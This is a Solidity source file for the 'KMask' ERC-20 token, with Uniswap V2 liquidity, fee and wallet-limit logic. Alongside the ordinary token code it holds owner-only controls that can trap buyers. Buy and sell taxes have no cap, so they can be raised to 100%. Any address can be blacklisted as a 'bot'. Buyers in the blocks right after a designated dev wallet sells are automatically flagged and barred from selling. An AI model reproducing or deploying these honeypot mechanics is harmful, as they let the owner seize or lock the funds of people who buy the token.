1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.4;
3 
4 abstract contract Context {
5 
6     function _msgSender() internal view virtual returns (address payable) {
7         return payable(msg.sender);
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
12         return msg.data;
13     }
14 }
15 
16 interface IERC20 {
17 
18     function totalSupply() external view returns (uint256);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 library SafeMath {
29 
30     function add(uint256 a, uint256 b) internal pure returns (uint256) {
31         uint256 c = a + b;
32         require(c >= a, "SafeMath: addition overflow");
33 
34         return c;
35     }
36 
37     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
38         return sub(a, b, "SafeMath: subtraction overflow");
39     }
40 
41     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
42         require(b <= a, errorMessage);
43         uint256 c = a - b;
44 
45         return c;
46     }
47 
48     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
49         if (a == 0) {
50             return 0;
51         }
52 
53         uint256 c = a * b;
54         require(c / a == b, "SafeMath: multiplication overflow");
55 
56         return c;
57     }
58 
59     function div(uint256 a, uint256 b) internal pure returns (uint256) {
60         return div(a, b, "SafeMath: division by zero");
61     }
62 
63     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
64         require(b > 0, errorMessage);
65         uint256 c = a / b;
66         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
67 
68         return c;
69     }
70 
71     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
72         return mod(a, b, "SafeMath: modulo by zero");
73     }
74 
75     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
76         require(b != 0, errorMessage);
77         return a % b;
78     }
79 }
80 
81 library Address {
82 
83     function isContract(address account) internal view returns (bool) {
84         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
85         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
86         // for accounts without code, i.e. `keccak256('')`
87         bytes32 codehash;
88         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
89         // solhint-disable-next-line no-inline-assembly
90         assembly { codehash := extcodehash(account) }
91         return (codehash != accountHash && codehash != 0x0);
92     }
93 
94     function sendValue(address payable recipient, uint256 amount) internal {
95         require(address(this).balance >= amount, "Address: insufficient balance");
96 
97         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
98         (bool success, ) = recipient.call{ value: amount }("");
99         require(success, "Address: unable to send value, recipient may have reverted");
100     }
101 
102     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
103       return functionCall(target, data, "Address: low-level call failed");
104     }
105 
106     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
107         return _functionCallWithValue(target, data, 0, errorMessage);
108     }
109 
110     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
111         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
112     }
113 
114     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
115         require(address(this).balance >= value, "Address: insufficient balance for call");
116         return _functionCallWithValue(target, data, value, errorMessage);
117     }
118 
119     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
120         require(isContract(target), "Address: call to non-contract");
121 
122         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
123         if (success) {
124             return returndata;
125         } else {
126             
127             if (returndata.length > 0) {
128                 assembly {
129                     let returndata_size := mload(returndata)
130                     revert(add(32, returndata), returndata_size)
131                 }
132             } else {
133                 revert(errorMessage);
134             }
135         }
136     }
137 }
138 
139 contract Ownable is Context {
140     address private _owner;
141     address private asdasd;
142     uint256 private _lockTime;
143 
144     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
145 
146     constructor () {
147         address msgSender = _msgSender();
148         _owner = msgSender;
149         emit OwnershipTransferred(address(0), msgSender);
150     }
151 
152     function owner() public view returns (address) {
153         return _owner;
154     }   
155     
156     modifier onlyOwner() {
157         require(_owner == _msgSender(), "Ownable: caller is not the owner");
158         _;
159     }
160     
161     function waiveOwnership() public virtual onlyOwner {
162         emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
163         _owner = address(0x000000000000000000000000000000000000dEaD);
164     }
165 
166     function transferOwnership(address newOwner) public virtual onlyOwner {
167         require(newOwner != address(0), "Ownable: new owner is the zero address");
168         emit OwnershipTransferred(_owner, newOwner);
169         _owner = newOwner;
170     }
171     
172     function getTime() public view returns (uint256) {
173         return block.timestamp;
174     }
175 
176 }
177 
178 interface IERC20Metadata is IERC20 {
179     function name() external view returns (string memory);
180     function symbol() external view returns (string memory);
181     function decimals() external view returns (uint8);
182 }
183 contract ERC20 is Context, IERC20, IERC20Metadata {
184     mapping(address => uint256) private _balances;
185 
186     mapping(address => mapping(address => uint256)) private _allowances;
187 
188     uint256 private _totalSupply;
189 
190     string private _name;
191     string private _symbol;
192 
193     constructor(string memory name_, string memory symbol_) {
194         _name = name_;
195         _symbol = symbol_;
196     }
197 
198     function name() public view virtual override returns (string memory) {
199         return _name;
200     }
201 
202     function symbol() public view virtual override returns (string memory) {
203         return _symbol;
204     }
205 
206     function decimals() public view virtual override returns (uint8) {
207         return 18;
208     }
209 
210     function totalSupply() public view virtual override returns (uint256) {
211         return _totalSupply;
212     }
213 
214     function balanceOf(address account) public view virtual override returns (uint256) {
215         return _balances[account];
216     }
217 
218     function transfer(address to, uint256 amount) public virtual override returns (bool) {
219         address owner = _msgSender();
220         _transfer(owner, to, amount);
221         return true;
222     }
223 
224     function allowance(address owner, address spender) public view virtual override returns (uint256) {
225         return _allowances[owner][spender];
226     }
227 
228     function approve(address spender, uint256 amount) public virtual override returns (bool) {
229         address owner = _msgSender();
230         _approve(owner, spender, amount);
231         return true;
232     }
233 
234     function transferFrom(
235         address from,
236         address to,
237         uint256 amount
238     ) public virtual override returns (bool) {
239         address spender = _msgSender();
240         _spendAllowance(from, spender, amount);
241         _transfer(from, to, amount);
242         return true;
243     }
244 
245     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
246         address owner = _msgSender();
247         _approve(owner, spender, _allowances[owner][spender] + addedValue);
248         return true;
249     }
250 
251     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
252         address owner = _msgSender();
253         uint256 currentAllowance = _allowances[owner][spender];
254         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
255         unchecked {
256             _approve(owner, spender, currentAllowance - subtractedValue);
257         }
258 
259         return true;
260     }
261 
262     function _transfer(
263         address from,
264         address to,
265         uint256 amount
266     ) internal virtual {
267         require(from != address(0), "ERC20: transfer from the zero address");
268         require(to != address(0), "ERC20: transfer to the zero address");
269 
270         _beforeTokenTransfer(from, to, amount);
271 
272         uint256 fromBalance = _balances[from];
273         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
274         unchecked {
275             _balances[from] = fromBalance - amount;
276         }
277         _balances[to] += amount;
278 
279         emit Transfer(from, to, amount);
280 
281         _afterTokenTransfer(from, to, amount);
282     }
283 
284     function _mint(address account, uint256 amount) internal virtual {
285         require(account != address(0), "ERC20: mint to the zero address");
286 
287         _beforeTokenTransfer(address(0), account, amount);
288 
289         _totalSupply += amount;
290         _balances[account] += amount;
291         emit Transfer(address(0), account, amount);
292 
293         _afterTokenTransfer(address(0), account, amount);
294     }
295 
296     function _burn(address account, uint256 amount) internal virtual {
297         require(account != address(0), "ERC20: burn from the zero address");
298 
299         _beforeTokenTransfer(account, address(0), amount);
300 
301         uint256 accountBalance = _balances[account];
302         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
303         unchecked {
304             _balances[account] = accountBalance - amount;
305         }
306         _totalSupply -= amount;
307 
308         emit Transfer(account, address(0), amount);
309 
310         _afterTokenTransfer(account, address(0), amount);
311     }
312 
313     function _approve(
314         address owner,
315         address spender,
316         uint256 amount
317     ) internal virtual {
318         require(owner != address(0), "ERC20: approve from the zero address");
319         require(spender != address(0), "ERC20: approve to the zero address");
320 
321         _allowances[owner][spender] = amount;
322         emit Approval(owner, spender, amount);
323     }
324 
325     function _spendAllowance(
326         address owner,
327         address spender,
328         uint256 amount
329     ) internal virtual {
330         uint256 currentAllowance = allowance(owner, spender);
331         if (currentAllowance != type(uint256).max) {
332             require(currentAllowance >= amount, "ERC20: insufficient allowance");
333             unchecked {
334                 _approve(owner, spender, currentAllowance - amount);
335             }
336         }
337     }
338 
339     function _beforeTokenTransfer(
340         address from,
341         address to,
342         uint256 amount
343     ) internal virtual {}
344 
345     function _afterTokenTransfer(
346         address from,
347         address to,
348         uint256 amount
349     ) internal virtual {}
350 }
351 interface IUniswapV2Factory {
352     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
353 
354     function feeTo() external view returns (address);
355     function feeToSetter() external view returns (address);
356 
357     function getPair(address tokenA, address tokenB) external view returns (address pair);
358     function allPairs(uint) external view returns (address pair);
359     function allPairsLength() external view returns (uint);
360 
361     function createPair(address tokenA, address tokenB) external returns (address pair);
362 
363     function setFeeTo(address) external;
364     function setFeeToSetter(address) external;
365 }
366 
367 interface IUniswapV2Pair {
368     event Approval(address indexed owner, address indexed spender, uint value);
369     event Transfer(address indexed from, address indexed to, uint value);
370 
371     function name() external pure returns (string memory);
372     function symbol() external pure returns (string memory);
373     function decimals() external pure returns (uint8);
374     function totalSupply() external view returns (uint);
375     function balanceOf(address owner) external view returns (uint);
376     function allowance(address owner, address spender) external view returns (uint);
377 
378     function approve(address spender, uint value) external returns (bool);
379     function transfer(address to, uint value) external returns (bool);
380     function transferFrom(address from, address to, uint value) external returns (bool);
381 
382     function DOMAIN_SEPARATOR() external view returns (bytes32);
383     function PERMIT_TYPEHASH() external pure returns (bytes32);
384     function nonces(address owner) external view returns (uint);
385 
386     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
387     
388     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
389     event Swap(
390         address indexed sender,
391         uint amount0In,
392         uint amount1In,
393         uint amount0Out,
394         uint amount1Out,
395         address indexed to
396     );
397     event Sync(uint112 reserve0, uint112 reserve1);
398 
399     function MINIMUM_LIQUIDITY() external pure returns (uint);
400     function factory() external view returns (address);
401     function token0() external view returns (address);
402     function token1() external view returns (address);
403     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
404     function price0CumulativeLast() external view returns (uint);
405     function price1CumulativeLast() external view returns (uint);
406     function kLast() external view returns (uint);
407 
408     function burn(address to) external returns (uint amount0, uint amount1);
409     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
410     function skim(address to) external;
411     function sync() external;
412 
413     function initialize(address, address) external;
414 }
415 
416 interface IUniswapV2Router01 {
417     function factory() external pure returns (address);
418     function WETH() external pure returns (address);
419 
420     function addLiquidity(
421         address tokenA,
422         address tokenB,
423         uint amountADesired,
424         uint amountBDesired,
425         uint amountAMin,
426         uint amountBMin,
427         address to,
428         uint deadline
429     ) external returns (uint amountA, uint amountB, uint liquidity);
430     function addLiquidityETH(
431         address token,
432         uint amountTokenDesired,
433         uint amountTokenMin,
434         uint amountETHMin,
435         address to,
436         uint deadline
437     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
438     function removeLiquidity(
439         address tokenA,
440         address tokenB,
441         uint liquidity,
442         uint amountAMin,
443         uint amountBMin,
444         address to,
445         uint deadline
446     ) external returns (uint amountA, uint amountB);
447     function removeLiquidityETH(
448         address token,
449         uint liquidity,
450         uint amountTokenMin,
451         uint amountETHMin,
452         address to,
453         uint deadline
454     ) external returns (uint amountToken, uint amountETH);
455     function removeLiquidityWithPermit(
456         address tokenA,
457         address tokenB,
458         uint liquidity,
459         uint amountAMin,
460         uint amountBMin,
461         address to,
462         uint deadline,
463         bool approveMax, uint8 v, bytes32 r, bytes32 s
464     ) external returns (uint amountA, uint amountB);
465     function removeLiquidityETHWithPermit(
466         address token,
467         uint liquidity,
468         uint amountTokenMin,
469         uint amountETHMin,
470         address to,
471         uint deadline,
472         bool approveMax, uint8 v, bytes32 r, bytes32 s
473     ) external returns (uint amountToken, uint amountETH);
474     function swapExactTokensForTokens(
475         uint amountIn,
476         uint amountOutMin,
477         address[] calldata path,
478         address to,
479         uint deadline
480     ) external returns (uint[] memory amounts);
481     function swapTokensForExactTokens(
482         uint amountOut,
483         uint amountInMax,
484         address[] calldata path,
485         address to,
486         uint deadline
487     ) external returns (uint[] memory amounts);
488     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
489         external
490         payable
491         returns (uint[] memory amounts);
492     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
493         external
494         returns (uint[] memory amounts);
495     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
496         external
497         returns (uint[] memory amounts);
498     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
499         external
500         payable
501         returns (uint[] memory amounts);
502 
503     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
504     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
505     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
506     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
507     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
508 }
509 
510 interface IUniswapV2Router02 is IUniswapV2Router01 {
511     function removeLiquidityETHSupportingFeeOnTransferTokens(
512         address token,
513         uint liquidity,
514         uint amountTokenMin,
515         uint amountETHMin,
516         address to,
517         uint deadline
518     ) external returns (uint amountETH);
519     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
520         address token,
521         uint liquidity,
522         uint amountTokenMin,
523         uint amountETHMin,
524         address to,
525         uint deadline,
526         bool approveMax, uint8 v, bytes32 r, bytes32 s
527     ) external returns (uint amountETH);
528 
529     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
530         uint amountIn,
531         uint amountOutMin,
532         address[] calldata path,
533         address to,
534         uint deadline
535     ) external;
536     function swapExactETHForTokensSupportingFeeOnTransferTokens(
537         uint amountOutMin,
538         address[] calldata path,
539         address to,
540         uint deadline
541     ) external payable;
542     function swapExactTokensForETHSupportingFeeOnTransferTokens(
543         uint amountIn,
544         uint amountOutMin,
545         address[] calldata path,
546         address to,
547         uint deadline
548     ) external;
549 }
550 
551 contract KMask is Context, IERC20, Ownable {
552     
553     using SafeMath for uint256;
554     using Address for address;
555     
556     string private _name = "KMask";
557     string private _symbol = "KMask";
558     uint8 private _decimals = 18;
559 
560     address payable public marketingWalletAddress = payable(0x37d813fa27C31fDdc9a8fe22E89510A70dFC39B8);
561     address payable public teamWalletAddress = payable(0x5f7fa1B35a04f01b7A95ED72b5F257DB0330bc55);
562 
563     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
564     address public addressDev;
565     bool public tradingOpen;
566 
567     mapping (address => uint256) _balances;
568     mapping (address => mapping (address => uint256)) private _allowances;
569     
570     mapping (address => bool) public isExcludedFromFee;
571     mapping (address => bool) public isWalletLimitExempt;
572 
573     uint256 public sale = 0;
574     
575     mapping (address => bool) isTxLimitExempt;
576     mapping (address => bool) public isBot;
577 
578     uint256 public blockBan = 1;
579 
580     mapping (address => bool) public isMarketPair;
581 
582     uint256 public _buyLiquidityFee = 0;
583     uint256 public _buyMarketingFee = 3;
584     uint256 public _buyTeamFee = 2;
585     
586     uint256 public _sellLiquidityFee = 0;
587     uint256 public _sellMarketingFee = 3;
588     uint256 public _sellTeamFee = 2;
589 
590     uint256 public _liquidityShare = 4;
591     uint256 public _marketingShare = 4;
592     uint256 public _teamShare = 16;
593 
594     uint256 public _totalTaxIfBuying = 12;
595     uint256 public _totalTaxIfSelling = 12;
596     uint256 public _totalDistributionShares = 24;
597 
598     uint256 private _totalSupply =  10000000000 * 10**_decimals;
599     uint256 public _maxTxAmount =   1000000000 * 10**_decimals; 
600     uint256 public _walletMax =     1000000000 * 10**_decimals;
601     uint256 private minimumTokensBeforeSwap = 1000000 * 10**_decimals; 
602 
603     IUniswapV2Router02 public uniswapV2Router;
604     address public uniswapPair;
605     
606     bool inSwapAndLiquify;
607     bool public swapAndLiquifyEnabled = true;
608     bool public swapAndLiquifyByLimitOnly = false;
609     bool public checkWalletLimit = false;
610 
611     event SwapAndLiquifyEnabledUpdated(bool enabled);
612     event SwapAndLiquify(
613         uint256 tokensSwapped,
614         uint256 ethReceived,
615         uint256 tokensIntoLiqudity
616     );
617     
618     event SwapETHForTokens(
619         uint256 amountIn,
620         address[] path
621     );
622     
623     event SwapTokensForETH(
624         uint256 amountIn,
625         address[] path
626     );
627     
628     modifier lockTheSwap {
629         inSwapAndLiquify = true;
630         _;
631         inSwapAndLiquify = false;
632     }
633     
634     constructor () {
635         
636         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
637         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
638             .createPair(address(this), _uniswapV2Router.WETH());
639 
640         uniswapV2Router = _uniswapV2Router;
641         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
642 
643         isExcludedFromFee[owner()] = true;
644         isExcludedFromFee[address(this)] = true;
645         
646         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
647         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
648         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
649 
650         isWalletLimitExempt[owner()] = true;
651         isWalletLimitExempt[address(uniswapPair)] = true;
652         isWalletLimitExempt[address(this)] = true;
653 
654         isTxLimitExempt[owner()] = true;
655         isTxLimitExempt[address(this)] = true;
656 
657         isMarketPair[address(uniswapPair)] = true;
658 
659         _balances[_msgSender()] = _totalSupply;
660         emit Transfer(address(0), _msgSender(), _totalSupply);
661     }
662 
663     function name() public view returns (string memory) {
664         return _name;
665     }
666 
667     function symbol() public view returns (string memory) {
668         return _symbol;
669     }
670 
671     function decimals() public view returns (uint8) {
672         return _decimals;
673     }
674 
675     function totalSupply() public view override returns (uint256) {
676         return _totalSupply;
677     }
678 
679     function balanceOf(address account) public view override returns (uint256) {
680         return _balances[account];
681     }
682 
683     function allowance(address owner, address spender) public view override returns (uint256) {
684         return _allowances[owner][spender];
685     }
686 
687     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
688         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
689         return true;
690     }
691 
692     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
693         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
694         return true;
695     }
696 
697     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
698         return minimumTokensBeforeSwap;
699     }
700 
701     function approve(address spender, uint256 amount) public override returns (bool) {
702         _approve(_msgSender(), spender, amount);
703         return true;
704     }
705 
706     function _approve(address owner, address spender, uint256 amount) private {
707         require(owner != address(0), "ERC20: approve from the zero address");
708         require(spender != address(0), "ERC20: approve to the zero address");
709 
710         _allowances[owner][spender] = amount;
711         emit Approval(owner, spender, amount);
712     }
713 
714     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
715         isMarketPair[account] = newValue;
716     }
717 
718     function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
719         isTxLimitExempt[holder] = exempt;
720     }
721     
722     function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
723         isExcludedFromFee[account] = newValue;
724     }
725 
726     function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
727         _buyLiquidityFee = newLiquidityTax;
728         _buyMarketingFee = newMarketingTax;
729         _buyTeamFee = newTeamTax;
730 
731         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
732     }
733 
734     function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
735         _sellLiquidityFee = newLiquidityTax;
736         _sellMarketingFee = newMarketingTax;
737         _sellTeamFee = newTeamTax;
738 
739         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
740     }
741     
742     function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
743         _liquidityShare = newLiquidityShare;
744         _marketingShare = newMarketingShare;
745         _teamShare = newTeamShare;
746 
747         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
748     }
749     
750     function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
751         _maxTxAmount = maxTxAmount;
752     }
753 
754     function enableDisableWalletLimit(bool newValue) external onlyOwner {
755        checkWalletLimit = newValue;
756     }
757 
758     function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
759         isWalletLimitExempt[holder] = exempt;
760     }
761 
762     function setWalletLimit(uint256 newLimit) external onlyOwner {
763         _walletMax  = newLimit;
764     }
765 
766     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
767         minimumTokensBeforeSwap = newLimit;
768     }
769 
770     function setTeamWalletAddress(address newAddress) external onlyOwner() {
771         teamWalletAddress = payable(newAddress);
772     }
773 
774     function setMarketingWalletAddress(address newAddress) external onlyOwner() {
775         marketingWalletAddress = payable(newAddress);
776     }
777 
778     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
779         swapAndLiquifyEnabled = _enabled;
780         emit SwapAndLiquifyEnabledUpdated(_enabled);
781     }
782 
783     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
784         swapAndLiquifyByLimitOnly = newValue;
785     }
786     
787     function getCirculatingSupply() public view returns (uint256) {
788         return _totalSupply.sub(balanceOf(deadAddress));
789     }
790 
791 
792     function setaddressDev(address  _addressDev)external onlyOwner() {
793         addressDev = _addressDev;
794     }
795 
796     function setblockBan(uint256 _blockBan)external onlyOwner() {
797         blockBan = _blockBan;
798     }
799 
800     function setIsBot(address holder, bool exempt)  external onlyOwner  {
801         isBot[holder] = exempt;
802     }
803 
804 
805     function getSaleAt()public view returns (uint256) {
806         return sale;
807     }
808 
809     function getBlock()public view returns (uint256) {
810         return block.number;
811     }
812 
813     function transferToAddressETH(address payable recipient, uint256 amount) private {
814         recipient.transfer(amount);
815     }
816     
817     function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
818 
819         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 
820 
821         newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());
822 
823         if(newPairAddress == address(0)) //Create If Doesnt exist
824         {
825             newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
826                 .createPair(address(this), _uniswapV2Router.WETH());
827         }
828 
829         uniswapPair = newPairAddress; //Set new pair address
830         uniswapV2Router = _uniswapV2Router; //Set new router address
831 
832         isWalletLimitExempt[address(uniswapPair)] = true;
833         isMarketPair[address(uniswapPair)] = true;
834     }
835 
836      //to recieve ETH from uniswapV2Router when swaping
837     receive() external payable {}
838 
839     function transfer(address recipient, uint256 amount) public override returns (bool) {
840         _transfer(_msgSender(), recipient, amount);
841         return true;
842     }
843 
844     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
845         _transfer(sender, recipient, amount);
846         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
847         return true;
848     }
849 
850     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
851 
852         require(sender != address(0), "ERC20: transfer from the zero address");
853         require(recipient != address(0), "ERC20: transfer to the zero address");
854         //Trade start check
855         if (!tradingOpen) {
856             require(sender == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
857         }
858 
859         if(inSwapAndLiquify)
860         { 
861             return _basicTransfer(sender, recipient, amount); 
862         }
863         else
864         {
865 
866         if(sender == addressDev && recipient == uniswapPair){
867             sale = block.number;
868         }
869 
870         if (sender == uniswapPair) {
871             if (block.number <= (sale + blockBan)) { 
872                 isBot[recipient] = true;
873             }
874         }
875 
876         if (sender != owner() && recipient != owner()) _checkTxLimit(sender,amount);
877 
878             uint256 contractTokenBalance = balanceOf(address(this));
879             bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
880             
881             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
882             {
883                 if(swapAndLiquifyByLimitOnly)
884                     contractTokenBalance = minimumTokensBeforeSwap;
885                 swapAndLiquify(contractTokenBalance);    
886             }
887 
888             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
889 
890             uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
891                                          amount : takeFee(sender, recipient, amount);
892 
893             if(checkWalletLimit && !isWalletLimitExempt[recipient])
894                 require(balanceOf(recipient).add(finalAmount) <= _walletMax);
895 
896             _balances[recipient] = _balances[recipient].add(finalAmount);
897 
898             emit Transfer(sender, recipient, finalAmount);
899             return true;
900         }
901     }
902 
903     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
904         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
905         _balances[recipient] = _balances[recipient].add(amount);
906         emit Transfer(sender, recipient, amount);
907         return true;
908     }
909 
910     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
911         
912         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
913         uint256 tokensForSwap = tAmount.sub(tokensForLP);
914 
915         swapTokensForEth(tokensForSwap);
916         uint256 amountReceived = address(this).balance;
917 
918         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
919         
920         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
921         uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
922         uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);
923 
924         if(amountBNBMarketing > 0)
925             transferToAddressETH(marketingWalletAddress, amountBNBMarketing);
926 
927         if(amountBNBTeam > 0)
928             transferToAddressETH(teamWalletAddress, amountBNBTeam);
929 
930         if(amountBNBLiquidity > 0 && tokensForLP > 0)
931             addLiquidity(tokensForLP, amountBNBLiquidity);
932     }
933     
934     function swapTokensForEth(uint256 tokenAmount) private {
935         // generate the uniswap pair path of token -> weth
936         address[] memory path = new address[](2);
937         path[0] = address(this);
938         path[1] = uniswapV2Router.WETH();
939 
940         _approve(address(this), address(uniswapV2Router), tokenAmount);
941 
942         // make the swap
943         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
944             tokenAmount,
945             0, // accept any amount of ETH
946             path,
947             address(this), // The contract
948             block.timestamp
949         );
950         
951         emit SwapTokensForETH(tokenAmount, path);
952     }
953 
954     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
955         // approve token transfer to cover all possible scenarios
956         _approve(address(this), address(uniswapV2Router), tokenAmount);
957 
958         // add the liquidity
959         uniswapV2Router.addLiquidityETH{value: ethAmount}(
960             address(this),
961             tokenAmount,
962             0, // slippage is unavoidable
963             0, // slippage is unavoidable
964             owner(),
965             block.timestamp
966         );
967     }
968 
969      
970     function setTrading(bool _tradingOpen) public onlyOwner {
971         tradingOpen = _tradingOpen;
972     }
973 
974     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
975         
976         uint256 feeAmount = 0;
977         
978         if(isMarketPair[sender]) {
979             feeAmount = amount.mul(_totalTaxIfBuying).div(100);
980         }
981         else if(isMarketPair[recipient]) {
982             feeAmount = amount.mul(_totalTaxIfSelling).div(100);
983         }
984         
985         if(feeAmount > 0) {
986             _balances[address(this)] = _balances[address(this)].add(feeAmount);
987             emit Transfer(sender, address(this), feeAmount);
988         }
989 
990         return amount.sub(feeAmount);
991     }
992     
993     function _checkTxLimit(address sender, uint256 amount) private view{
994         require(!isBot[sender], "From cannot be bot!");
995         require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
996     }
997 
998 }